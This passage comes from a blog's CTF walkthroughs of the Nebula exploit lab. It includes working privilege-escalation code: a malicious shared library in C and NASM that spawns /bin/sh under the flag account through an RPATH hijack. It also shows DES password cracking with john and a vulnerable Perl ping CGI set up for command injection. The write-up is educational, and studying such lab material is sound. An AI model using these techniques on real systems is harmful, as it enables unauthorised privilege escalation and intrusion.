</span><span class='line'>00000000  ff 00 01 02                                       |....|
</span><span class='line'>00000004</span></code></pre></td></tr></table></div></figure>


<p>Now we use the reverse process to decrypt the token:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level14@nebula:/home/flag14$</span> ruby -pe <span class="s1">&#39;puts $_[0..-3].force_encoding(&quot;iso-8859-1&quot;).split(//).each_with_index.map {|x,i| (x.ord-i).chr}.join&#39;</span> &lt; token
</span><span class='line'><span class="go">8457c118-887c-4e40-a5a6-33a25353165</span>
</span><span class='line'><span class="go">857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.</span>
</span><span class='line'>
</span><span class='line'><span class="gp">level14@nebula:/home/flag14$</span> su flag14
</span><span class='line'><span class="go">Password: </span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Level15</h2>

<p>From strace output we can see that the binary is trying to link shared library from <code>/var/tmp/flag15</code> directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> strace -f /home/flag15/flag15
</span><span class='line'><span class="go">execve(&quot;/home/flag15/flag15&quot;, [&quot;/home/flag15/flag15&quot;], [/* 21 vars */]) = 0</span>
</span><span class='line'><span class="go">brk(0)                                  = 0x8b1f000</span>
</span><span class='line'><span class="go">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784c000</span>
</span><span class='line'><span class="go">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&quot;/var/tmp/flag15&quot;, 0xbf8a8bb4)   = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3</span>
</span><span class='line'><span class="go">fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7843000</span>
</span><span class='line'><span class="go">close(3)                                = 0</span>
</span><span class='line'><span class="go">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3</span>
</span><span class='line'><span class="go">read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512</span>
</span><span class='line'><span class="go">fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000</span>
</span><span class='line'><span class="go">mmap2(0x286000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x286000</span>
</span><span class='line'><span class="go">mmap2(0x289000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x289000</span>
</span><span class='line'><span class="go">close(3)                                = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7842000</span>
</span><span class='line'><span class="go">set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78428d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0</span>
</span><span class='line'><span class="go">mprotect(0x286000, 8192, PROT_READ)     = 0</span>
</span><span class='line'><span class="go">mprotect(0x8049000, 4096, PROT_READ)    = 0</span>
</span><span class='line'><span class="go">mprotect(0x46b000, 4096, PROT_READ)     = 0</span>
</span><span class='line'><span class="go">munmap(0xb7843000, 33815)               = 0</span>
</span><span class='line'><span class="go">fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784b000</span>
</span><span class='line'><span class="go">write(1, &quot;strace it!\n&quot;, 11strace it!</span>
</span><span class='line'><span class="go">)            = 11</span>
</span><span class='line'><span class="go">exit_group(11)                          = ?</span>
</span></code></pre></td></tr></table></div></figure>


<p>We try to provide this library (in <code>/var/tmp/flag15/libc.so.6</code>):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> cat libc.so.6.c
</span><span class='line'><span class="go">void f(void *a) {} </span>
</span><span class='line'>
</span><span class='line'><span class="gp">level15@nebula:/tmp$</span> mkdir /var/tmp/flag15
</span><span class='line'>
</span><span class='line'><span class="gp">level15@nebula:/tmp$</span> gcc -shared libc.so.6.c -o /var/tmp/flag15/libc.so.6
</span><span class='line'>
</span><span class='line'><span class="gp">level15@nebula:/tmp$</span> /home/flag15/flag15
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</span>
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)</span>
</span><span class='line'><span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference</span>
</span></code></pre></td></tr></table></div></figure>


<p>There is an error, because we are linking using GLIBC_2.1.3, but in the binary, there are two symbols with GLIBC_2.0 undefined:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ nm /home/flag15/flag15  | grep ".*U"
</span><span class='line'>         U __libc_start_main@@GLIBC_2.0
</span><span class='line'>         U puts@@GLIBC_2.0</span></code></pre></td></tr></table></div></figure>


<p>We provide version script to the linker, link statically and try the same thing again.</p>

<figure class='code'><figcaption><span>version.map </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">GLIBC_2.0   {};</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>libc.so.6.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ gcc -shared -static-libgcc -Wl,--version-script=version.map,-Bstatic libc.so.6.c -o /var/tmp/flag15/libc.so.6
</span><span class='line'>
</span><span class='line'>level15@nebula:/tmp$ /home/flag15/flag15 
</span><span class='line'>flag15@nebula:/tmp$ getflag 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<p>The second way how to solve the challenge is without linking libc, writing assembler code. For this purpose we used <a href="http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/">nasm</a>
assembler, everything needed for the compilation process was already on the nebula iso.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ wget -q http://www.nasm.us/pub/nasm/releasebuilds/2.11.08/nasm-2.11.08.tar.gz
</span><span class='line'>level15@nebula:/tmp$ tar xzf nasm-2.11.08.tar.gz 
</span><span class='line'>level15@nebula:/tmp$ cd nasm-2.11.08/
</span><span class='line'>level15@nebula:/tmp/nasm-2.11.08$ ./configure && make ; cd ..</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>shell.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0x0</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'>
</span><span class='line'><span class="nf">global</span> <span class="no">shell</span>
</span><span class='line'>
</span><span class='line'><span class="nl">shell:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span><span class="no">geteuid</span><span class="p">())</span><span class="err">;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>run-shell.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">shell</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">init</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">shell</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> /tmp/nasm-2.11.08/nasm -f elf shell.asm
</span><span class='line'>
</span><span class='line'><span class="gp">level15@nebula:/tmp$</span> gcc -shared -nostdlib run-shell.c shell.o -o /var/tmp/flag15/libc.so.6
</span><span class='line'>
</span><span class='line'><span class="gp">level15@nebula:/tmp$</span> /home/flag15/flag15
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)</span>
</span><span class='line'>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (06-10)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/17/exploit-exercises-nebula-06-10/"/>
    <updated>2015-06-17T00:05:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/17/exploit-exercises-nebula-06-10</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level06</h2>

<p>From the assignment &ldquo;The flag06 account credentials came from a legacy unix
system&rdquo; we conclude that the password is stored in /etc/passwd.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ grep flag06 /etc/passwd
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</span></code></pre></td></tr></table></div></figure>


<p>We store credentials to /tmp/hash.txt and use john:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ john /tmp/hash.txt 
</span><span class='line'>Created directory: /home/level06/.john
</span><span class='line'>Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
</span><span class='line'>hello            (flag06)
</span><span class='line'>guesses: 1  time: 0:00:00:00 100% (2)  c/s: 75300  trying: 12345 - biteme
</span><span class='line'>Use the "--show" option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure>


<p>Now we can log using &lsquo;hello&rsquo; password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ su - flag06
</span><span class='line'>Password: 
</span><span class='line'>flag06@nebula:~$ getflag 
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level07</h2>

<figure class='code'><figcaption><span>index.cgi </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s">&quot;$line&quot;</span><span class="p">;</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># check if Host set. if not, display normal page, etc</span>
</span><span class='line'>
</span><span class='line'><span class="n">ping</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;Host&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>The configuration file is stored in &lsquo;/home/flag07/thttpd.conf&rsquo;.</p>

<p>Because there is no input validation, we have RCE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level07@nebula:~$ wget -qO- "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1"
</span><span class='line'>&lt;html>&lt;head>&lt;title>Ping results&lt;/title>&lt;/head>&lt;body>&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.009 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
</span><span class='line'>64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.023 ms
</span><span class='line'>
</span><span class='line'>--- 127.0.0.1 ping statistics ---
</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 2000ms
</span><span class='line'>rtt min/avg/max/mdev = 0.009/0.018/0.023/0.006 ms
</span><span class='line'>&lt;/pre>&lt;/body>&lt;/html>
</span><span class='line'>
